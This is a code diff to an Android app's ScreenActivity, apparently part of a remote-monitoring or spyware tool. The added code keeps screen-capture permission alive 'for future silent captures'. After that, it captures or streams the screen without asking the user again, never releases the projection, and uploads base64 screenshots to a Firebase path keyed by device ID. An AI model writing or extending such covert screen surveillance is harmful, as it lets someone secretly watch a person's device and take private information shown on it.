@@ -29,11 +29,25 @@ public class ScreenActivity extends Activity {
     private VirtualDisplay virtualDisplay;
     private int resultCode;
     private Intent resultData;
+    private boolean forStream = false;
 
     @Override
     protected void onCreate(Bundle s) {
         super.onCreate(s);
+        forStream = getIntent().getBooleanExtra("for_stream", false);
         mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+
+        // Agar pehle se permission hai to direct capture
+        if (ScreenCaptureHolder.mp != null) {
+            if (forStream) {
+                startService(new Intent(this, StreamService.class));
+            } else {
+                ScreenCaptureHolder.captureOnce(this);
+            }
+            finish();
+            return;
+        }
+
         startActivityForResult(mpm.createScreenCaptureIntent(), 100);
     }
 
@@ -43,7 +57,22 @@ public class ScreenActivity extends Activity {
         if (requestCode == 100 && resultCode == RESULT_OK) {
             this.resultCode = resultCode;
             this.resultData = data;
-            captureScreen();
+
+            // Persist MediaProjection for future silent captures
+            mp = mpm.getMediaProjection(resultCode, data);
+            ScreenCaptureHolder.setMediaProjection(mp);
+
+            if (forStream) {
+                Intent i = new Intent(this, StreamService.class);
+                if (android.os.Build.VERSION.SDK_INT >= 26) {
+                    startForegroundService(i);
+                } else {
+                    startService(i);
+                }
+                finish();
+            } else {
+                captureScreen();
+            }
         } else {
             finish();
         }
@@ -57,7 +86,6 @@ public class ScreenActivity extends Activity {
         int density = metrics.densityDpi;
 
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-        mp = mpm.getMediaProjection(resultCode, resultData);
 
         virtualDisplay = mp.createVirtualDisplay(
                 "ScreenCapture", width, height, density,
@@ -82,7 +110,8 @@ public class ScreenActivity extends Activity {
                         String timeStr = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                                 .format(new Date());
                         String json = "{\"image\":\"" + b64 + "\",\"time\":\"" + timeStr + "\"}";
-                        FirebaseHelper.put("devices/" + devId + "/screenshots/" + System.currentTimeMillis() + ".json", json);
+                        FirebaseHelper.put("devices/" + devId + "/screenshots/"
+                                + System.currentTimeMillis() + ".json", json);
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -112,6 +141,6 @@ public class ScreenActivity extends Activity {
     private void cleanup() {
         if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
         if (imageReader != null) { imageReader.close(); imageReader = null; }
-        if (mp != null) { mp.stop(); mp = null; }
+        // NOTE: mp ko release NAHI karte — ScreenCaptureHolder me persist karta hai
     }
 }
